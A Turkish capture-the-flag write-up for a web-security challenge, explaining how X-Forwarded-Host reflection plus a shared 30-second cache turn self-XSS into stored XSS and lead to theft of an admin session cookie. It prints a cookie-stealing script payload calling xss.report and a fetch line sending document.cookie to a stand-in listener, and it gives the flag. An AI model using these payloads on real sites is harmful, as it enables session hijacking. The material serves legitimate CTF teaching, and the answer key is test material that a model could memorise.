# Toksik Ön Bellek

|    |  |
| ------------- |-------------|
| Zorluk        | Zor (500 Puan)|
| Aşama         | Yarı Final    |
| Soru Türü     | Web Güvenliği |
| Yazar(lar)    | [İbrahim CAN](http://github.com/cibrx) |

## Soru Metni

```
Cibrx ve stajyeri aralarında konuşurken kendi sitelerinde yazdıkları makaledeki açığın olduğunu fark ederler.
```

## Çözüm

- Siteye girdiğimizde bizi bir giriş sayfası bizi karşılamaktadır.
- Hesap oluşturup hesaba giriş yaptığımızda, sitenin bir blog sayfası olduğunu fark etmekteyiz.
- Site üzerindeki özellikler kontrol edilip bağlantılar ziyaret edildiğinde `/chat` adresinde bir sohbet sayfasına ve `/profile` adresinde de bir profil sayfasına rastlanır. Profil sayfasında kullanıcı bilgileri ve sahte bir flag olduğu görülür.
- Sohbette Cibrx ve stajyerinin, üzerine blog yazdıkları bir güvenlik açığının sitelerinde de olduğundan bahsettikleri görülür.
- Sitedeki bulunan 2 blog incelendiğinde 2. blogda web önbelleğiyle ilgili bir açıktan bahsedildiği anlaşılır.
- Siteye gönderilen isteklerin yanıtlarındaki başlıklar kontrol edildiğinde 'age', 'max-age', 'x-cache' başlıklarının varlığına rastlanır. Bu da bir önbellek sisteminin varlığına işarettir.
- Ardından blog sayfasında ara ara bozuk gelen logo fark edilir. Site kaynağı incelendiğinde fotoğrafın `//localhost:3000/img/banner_logo.png` adresinde bulunduğu görülür. Fotoğraf adresi zaman zaman değişmektedir, bu da bozulmanın sebebidir.
- Ardından yazıda bahsedilen 'X-Forwarded-Host' başlığından kaynaklanan güvenlik açığının varlığı kontrol edilir. Kullanıcıya döndürülen HTML içeriğinde(logo resminin kaynak adresinde) başlığın değeri olduğu gibi yerleştirilmiştir. Kullanıcıdan alınan değerin html içine doğrudan gömülmesi, siteyi xss saldırılarına karşı savunmasız kılar. Böylelikle kullanıcı sadece kendi oturumunda xss saldırısı yapabilmektedir.
- Yanıttaki başlıklardan önbellekle ilgili olanlar incelendiğinde, sitede 30 saniye tutulacak şekilde bir önbellekleme yapıldığı keşfedilir. Kullanıcıdan alınan 'X-Forwarded-Host' başlığını içeren HTML, önbelleklenen içeriğe dahildir. Önbellek kişi oturumuna özel tutulmadığından önbelleklenen içerik başka kullanıcılara da yanıt olarak döndürülmektedir. Bu da XSS zafiyetinin başka kullanıcılara karşı da kullanılmasına olanak tanır. Açık Self XSS'ten Stored XSS'e dönüşmüştür.
- DevTools ya da Set-Cookie başlıkları incelenerek 'cibrx-session' adlı cookie incelendiğinde HttpOnly değerinin false olduğu görülür. Bu da cookie'lere script aracılığıyla erişim sağlanmasının mümkün olduğunu gösterir.
- Kullanıcının çerezlerini çalan bir JavaScript kodu içeren bir xss payload'u hazırlanıp enjekte edilerek önbellek zehirlenir. Giriş yapan kullanıcıların cihazında bu kod çalışarak çerezlerini çalacaktır.
- Örnek bir XSS payload'u şu şekilde olabilir:
`'"><script src=https://xss.report/c/boylebirkullanıcıyok></script>`
Bu payload, mevcut bir `<img>` elementinin src kısmını `'` ve `"` işaretleri ile aşar ve yeni bir `<script>` etiketi oluşturur. Bu sayede, saldırgan kötü niyetli bir JavaScript dosyasını tarayıcıya yükler ve bu script, siteyi ziyaret eden kullanıcıların cookie bilgilerini toplar.
Bir dinleyiciye (listener) ihtiyacımız olacak. Bu durumda, xss.report sitesi bizim için işleri oldukça kolaylaştırır. Kendisine gönderilen tüm HTTP başlıklarını loglar ve daha sonra bu verileri bize sunar. Böylece siteyi ziyaret eden kullanıcıların cookie bilgilerine ulaşabiliriz. Ayrıca, `fetch('orneklistenersitesi.co/'+document.cookie)` gibi bir komut kullanarak document.cookie değerini bir dinleyiciye gönderebiliriz.
- Elde ettiğimiz cookie değerini, daha önce kendi hesabımızla giriş yaptığımız sitenin "İncele" (Inspect) sayfasını kullanarak değiştiriyoruz. Uygulama menüsünden mevcut cookie değerini yeni değerle güncelliyoruz ve sayfayı yeniliyoruz. Ardından, daha önce sahte bir flag gördüğümüz profil sayfasına gidiyoruz. Bu sayfada kullanıcı adının `Administrator` olduğunu ve hemen altında flag'in bulunduğunu görüyoruz. Bu şekilde soruyu başarıyla çözmüş oluyoruz.

## Flag

```
BayrakBende{B3n_d3_c4l1s1y0rum@9f#L8z&2$}
```
